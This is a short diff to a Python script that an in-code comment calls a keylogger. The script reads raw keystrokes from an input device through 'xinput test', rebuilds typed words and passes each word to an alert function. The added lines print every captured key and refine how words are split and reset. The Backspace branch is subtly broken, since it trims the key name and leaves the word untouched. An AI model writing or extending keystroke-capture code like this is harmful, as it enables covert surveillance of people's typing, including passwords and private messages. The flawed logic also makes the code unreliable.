@@ -117,8 +117,15 @@ process = subprocess.Popen( ['xinput', 'test', args.xinput], stdout=subprocess.P
 for line in unbuffered(process):
     letter = getKey(line)
     if str(letter) != 'None' or letter != None:
+        print(letter)
         if letter == 'space' or letter == 'KP_Enter' or letter == 'Return':
             alert(word)
+            word = ''
+        # Remove last char
+        elif letter == 'BackSpace':
+            letter = letter[:-1]
+        # This key create problem in the keylogger so reset the word
+        elif letter == 'Home' or letter == '~Prior' or letter == '~Next' or letter == 'Left' or letter == 'Right' or letter == 'Up' or letter == 'Down' or letter == 'Delete' or letter == 'End':
             word = ''
         # Ignore the functional key and append the letter
         elif len(letter) == 1:
